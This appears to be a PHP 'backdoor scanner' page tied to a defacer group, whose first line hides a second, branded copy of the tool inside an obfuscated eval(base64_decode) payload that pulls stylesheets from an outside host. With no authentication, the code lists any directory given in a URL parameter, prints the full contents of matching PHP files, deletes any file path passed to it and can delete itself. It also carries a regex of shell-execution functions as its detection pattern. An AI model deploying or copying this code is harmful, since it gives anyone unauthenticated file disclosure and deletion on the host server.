<?php eval(base64_decode('c2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ3psaWIub3V0cHV0X2NvbXByZXNzaW9uJywgMCk7CkBpbmlfc2V0KCdpbXBsaWNpdF9mbHVzaCcsIDEpOwpmb3IoJGkgPSAwOyAkaSA8IG9iX2dldF9sZXZlbCgpOyAkaSsrKSB7IG9iX2VuZF9mbHVzaCgpOyB9Cm9iX2ltcGxpY2l0X2ZsdXNoKDEpOwoKJHBhdGggPSBnZXRjd2QoKTsKaWYoaXNzZXQoJF9HRVRbJ2RpciddKSl7CiAgICAkcGF0aCA9JF9HRVRbJ2RpciddOwp9CgoKaWYoaXNzZXQoJF9HRVRbJ2tpbGwnXSkpewogICAgdW5saW5rKF9fRklMRV9fKTsKfQplY2hvICc8bGluayBocmVmPSJodHRwczovL3Jhc2VubWVkaWEubXkuaWQvYXNzZXRzL2Nzcy9ib290c3RyYXAtZGFyay5jc3MiIGlkPSJib290c3RyYXAtc3R5bGUiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+JzsKZWNobyAnPGxpbmsgaHJlZj0iaHR0cHM6Ly9yYXNlbm1lZGlhLm15LmlkL2Fzc2V0cy9jc3MvYWxsLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiPic7CmVjaG8gJzxsaW5rIGhyZWY9Imh0dHBzOi8vcmFzZW5tZWRpYS5teS5pZC9hc3NldHMvY3NzL2FwcC1kYXJrLmNzcyIgaWQ9ImFwcC1zdHlsZSIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+JzsKZWNobyAnPGRpdiBjbGFzcz0icGFnZS1jb250ZW50Ij4nOwplY2hvICc8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPiAgPGRpdiBjbGFzcz0icm93IGQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIj4nOwplY2hvICc8ZGl2IGNsYXNzPSJjb2wtMTIiPic7CmVjaG8gJzxkaXYgY2xhc3M9ImNhcmQiPic7CmVjaG8gJzxoNSBjbGFzcz0iY2FyZC1oZWFkZXIgYm9yZGVyLWJvdHRvbSB0ZXh0LXVwcGVyY2FzZSI+PGNlbnRlcj5TQ0FOTkVSIEJBQ0tET09SIEJPUk5FT1hQTE9JVCBWMTwvY2VudGVyPjwvaDU+JzsKZWNobyAnPGNlbnRlcj4gPGltZyBzcmM9Imh0dHBzOi8vaS5pYmIuY28vQkw2Qnh3TC9ib3JuZW94cGxvaXQucG5nIj4gPC9jZW50ZXI+ICc7CmVjaG8gJzxkaXYgY2xhc3M9ImNhcmQtYm9keSI+JzsKZWNobyAnPGRpdiBjbGFzcz0iYWxlcnQgYmctcHJpbWFyeSBiZy1ncmFkaWVudCB0ZXh0LWRhcmsgZC1mbGV4IGFsaWduLWl0ZW1zLWNlbnRlciIgcm9sZT0iYWxlcnQiPic7CmVjaG8gJzxpIGNsYXNzPSJieCBieC1pbmZvLWNpcmNsZSBmcy0yIG1lLTIiPjwvaT48Y2VudGVyPktvY29rIFRlcnVzIEtzYXRyaWEgQmF0YW5nIEhpdGFtIEthbXUgISEhIENvbnRhY3Q6IEh0dHBzOi8vdC5tZS9Cb3JuZW94cGxvaXQ0MDQgPC9jZW50ZXI+PC9kaXY+JzsKZWNobyAiPGEgaHJlZj0nP2tpbGwnPjxmb250IGNvbG9yPSdyZWQnPltTZWxmIERlbGV0ZV08L2ZvbnQ+PC9hPjxicj4iOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJnZXQiPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJ0ZXh0IiBuYW1lPSJkaXIiIHZhbHVlPScuJHBhdGguJyBzdHlsZT0id2lkdGg6IDkwMHB4OyI+PGJyPjxpbnB1dCBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IGJnLWdyYWRpZW50IHdhdmVzLWVmZmVjdCB3YXZlcy1saWdodCBtZS0xIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTY2FubmVyIj48L2Zvcm0+PGJyPic7CgplY2hvICJDVVJSRU5UIERJUjogPGZvbnQgY29sb3I9J2dyZWVuJz4kcGF0aDwvZm9udD48YnI+IjsKaWYoaXNzZXQoJF9HRVRbJ2RlbGV0ZSddKSl7CiAgICB1bmxpbmsoJF9HRVRbJ2RlbGV0ZSddKTsKICAgICRzdGF0dXMgPSAiPGZvbnQgY29sb3I9J3JlZCc+RkFJTEVEPC9mb250PiI7CiAgICBpZighZmlsZV9leGlzdHMoJF9HRVRbJ2RlbGV0ZSddKSl7CiAgICAgICAgJHN0YXR1cyA9ICI8Zm9udCBjb2xvcj0nbGlnaHRibHVlJz5TdWNjZXNzPC9mb250PiI7CgkJCiAgICB9CiAgICBlY2hvICJUUlkgVE8gREVMRVRFOiAiLiRfR0VUWydkZWxldGUnXS4iICRzdGF0dXMgPGJyPiI7ZXhpdDsKfQoKc2NhbkJhY2tkb29yKCRwYXRoKTsKZnVuY3Rpb24gc2F2ZSgkZm5hbWUsJHZhbHVlKXsKCSRmaWxlID0gZm9wZW4oJGZuYW1lLCAiYSIpOwoJZndyaXRlKCRmaWxlLCAkdmFsdWUpOwoJZmNsb3NlKCRmaWxlKTsvLwp9Ci8vICRkb21haW4gPSAkX1NFUlZFUlsnUkVRVUVTVF9TQ0hFTUUnXS4nLy8nLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwpmdW5jdGlvbiBjaGVja0JhY2tkb29yKCRmaWxlX2xvY2F0aW9uKXsKICAgIGdsb2JhbCAkcGF0aDsKICAgICRwYXRlcm4gPSAiI2V4ZWNcKHxnemluZmxhdGVcKHxmaWxlX3B1dF9jb250ZW50c1wofGZpbGVfZ2V0X2NvbnRlbnRzXCh8c3lzdGVtXCh8cGFzc3RocnVcKHxzaGVsbF9leGVjXCh8bW92ZV91cGxvYWRlZF9maWxlXCh8ZXZhbFwofGJhc2U2NCMiOwogICAgJGNvbnRlbnRzID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfbG9jYXRpb24pOwogICAgaWYoc3RybGVuKCRjb250ZW50cyk+IDApewogICAgICAgIGlmKHByZWdfbWF0Y2goJHBhdGVybiwgc3RydG9sb3dlcigkY29udGVudHMpKSl7CiAgICAgICAgICAgIGVjaG8gIlsrXSBTdXNzcGVjdCBmaWxlIC0+IDxmb250IGNvbG9yPSdyZWQnPiRmaWxlX2xvY2F0aW9uPC9mb250PiA8YSBocmVmPSc/ZGVsZXRlPSRmaWxlX2xvY2F0aW9uJmRpcj0kcGF0aCc+PGZvbnQgY2xhc3M9J2J0biBidG4tcHJpbWFyeSBiZy1ncmFkaWVudCB3YXZlcy1lZmZlY3Qgd2F2ZXMtbGlnaHQgbWUtMScgY29sb3I9J2xpZ2h0Ymx1ZSc+W0RFTEVURV08L2ZvbnQ+PC9hPiA8YnI+IjsKICAgICAgICAgICAgc2F2ZSgid29vdC50eHQiLCIkZmlsZV9sb2NhdGlvblxuIik7CiAgICAgICAgICAgIGVjaG8gJzx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJjb250ZW50IiBjb2xzPSI0NSIgcm93cz0iMTUiPicuaHRtbHNwZWNpYWxjaGFycygkY29udGVudHMpLic8L3RleHRhcmVhPjxicj48YnI+JzsKICAgICAgICB9CiAgICB9ICAgCn0KCmZ1bmN0aW9uIHNjYW5CYWNrZG9vcigkY3VycmVudF9kaXIpewoJaWYoaXNfcmVhZGFibGUoJGN1cnJlbnRfZGlyKSl7CgkgCSRkaXJfbG9jYXRpb24gPSBzY2FuZGlyKCRjdXJyZW50X2Rpcik7CgkJZm9yZWFjaCAoJGRpcl9sb2NhdGlvbiBhcyAkZmlsZSkgewogICAgICAgICAgICBpZigkZmlsZSA9PT0gIi4iIHwgJGZpbGUgPT09ICIuLiIpewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVfbG9jYXRpb24gPSBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsJGN1cnJlbnRfZGlyLicvJy4kZmlsZSk7CiAgICAgICAgICAgICRuRmlsZSA9IHN1YnN0cigkZmlsZSwgLTQsIDQpOwogICAgICAgICAgICBpZigkbkZpbGUgPT0gIi5waHAiKXsKICAgICAgICAgICAgICAgIGNoZWNrQmFja2Rvb3IoJGZpbGVfbG9jYXRpb24pOwogICAgICAgICAgICB9ZWxzZSBpZihpc19kaXIoJGZpbGVfbG9jYXRpb24pKXsKICAgICAgICAgICAgICAgIHNjYW5CYWNrZG9vcigkZmlsZV9sb2NhdGlvbik7CiAgICAgICAgICAgIH0KCQl9Cgl9Cn0=')); ?>
<?php
/*
author :sohay
title: backdoor scanner v 1.0.0
*/
echo '<style>body {background-color:#000;color:green;} body,td,th { font: 9pt Courier New;margin:0;vertical-align:top; } span,h1,a { color:#00ff00} span { font-weight: bolder; } h1 { border:1px solid #00ff00;padding: 2px 5px;font: 14pt Courier New;margin:0px; } div.content { padding: 5px;margin-left:5px;} a { text-decoration:none; } a:hover { background:#ff0000; } .ml1 { border:1px solid #444;padding:5px;margin:0;overflow: auto; } .bigarea { width:100%;height:250px; } input, textarea, select { margin:0;color:#00ff00;background-color:#000;border:1px solid #00ff00; font: 9pt Monospace,"Courier New"; } form { margin:0px; } #toolsTbl { text-align:center; } .toolsInp { width: 80%; } .main th {text-align:left;} .main tr:hover{background-color:#5e5e5e;} .main td, th{vertical-align:middle;} pre {font-family:Courier,Monospace;} #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft   document.documentElement.clientWidth - offsetWidth);} .style2 {color: #00FF00} .style3 {color: #009900} .style4 {color: #006600} .style5 {color: #00CC00} .style6 {color: #003300} .style8 {color: #33CC00} #footer { margin-bottom: 10px; color: #666; vertical-align: top; text-align: center; font-size: 11px; } #footer ul { margin: 0; padding: 0; list-style: none; } #footer li { display: inline-block; margin-right: 15px; border-right: 1px solid #666; vertical-align: middle; } #footer li a { margin-right: 15px; } #footer li:last-child { margin-right: 0; border-right: 0; } #footer li:last-child a { margin-right: 0; } #footer a { color: #666; } #footer a:hover { color: #858585; } #footer .footer-left { height: 20px; vertical-align: middle; line-height: 20px; } @media (min-width: 39rem) { #footer { display: flex; flex-flow: row wrap; justify-content: space-between; align-items: center; align-content: center; margin-bottom: 20px; } #footer .footer-left { align-self: flex-start; margin-right: 20px; } #footer .footer-right { align-self: flex-end; } }</style>';
set_time_limit(0);
error_reporting(0);
@ini_set('zlib.output_compression', 0);
@ini_set('implicit_flush', 1);
for($i = 0; $i < ob_get_level(); $i++) { ob_end_flush(); }
ob_implicit_flush(1);
// if($argv[1]){
// 	$dir = $argv[1];
// 	scanBackdoor("$dir");
// }else{
// 	echo "Usage php scan.php /home or /public_html/.";
// }




$path = getcwd();
if(isset($_GET['dir'])){
    $path =$_GET['dir'];
}


if(isset($_GET['kill'])){
    unlink(__FILE__);
}
echo "<a href='?kill'><font color='yellow'>[Self Delete]</font></a><br>";
echo '<form action="" method="get"> <input type="text" name="dir" value='.$path.' style="width: 548px;"> <input type="submit" value="scan"></form><br>';

echo "CURRENT DIR: <font color='yellow'>$path</font><br>";
if(isset($_GET['delete'])){
    unlink($_GET['delete']);
    $status = "<font color='red'>FAILED</font>";
    if(!file_exists($_GET['delete'])){
        $status = "<font color='yellow'>Success</font>";
		
    }
    echo "TRY TO DELETE: ".$_GET['delete']." $status <br>";exit;
}

scanBackdoor($path);
function save($fname,$value){
	$file = fopen($fname, "a");
	fwrite($file, $value);
	fclose($file);//
}
// $domain = $_SERVER['REQUEST_SCHEME'].'//'.$_SERVER['SERVER_NAME'];
function checkBackdoor($file_location){
    global $path;
    $patern = "#exec\(|gzinflate\(|file_put_contents\(|file_get_contents\(|system\(|passthru\(|shell_exec\(|move_uploaded_file\(|eval\(|base64#";
    $contents = file_get_contents($file_location);
    if(strlen($contents)> 0){
        if(preg_match($patern, strtolower($contents))){
            echo "[+] Susspect file -> <a href='?delete=$file_location&dir=$path'><font color='yellow'>[DELETE]</font></a> <font color='red'>$file_location</font> <br>";
            save("shell-found.txt","$file_location\n");
            echo '<textarea name="content" cols="80" rows="15">'.htmlspecialchars($contents).'</textarea><br>><br>';
        }
    }   
}

function scanBackdoor($current_dir){
	if(is_readable($current_dir)){
	 	$dir_location = scandir($current_dir);
		foreach ($dir_location as $file) {
            if($file === "." | $file === ".."){
                continue;
            }
            $file_location = str_replace("//", "/",$current_dir.'/'.$file);
            $nFile = substr($file, -4, 4);
            if($nFile == ".php"){
                checkBackdoor($file_location);
            }else if(is_dir($file_location)){
                scanBackdoor($file_location);
            }
		}
	}
}

?>
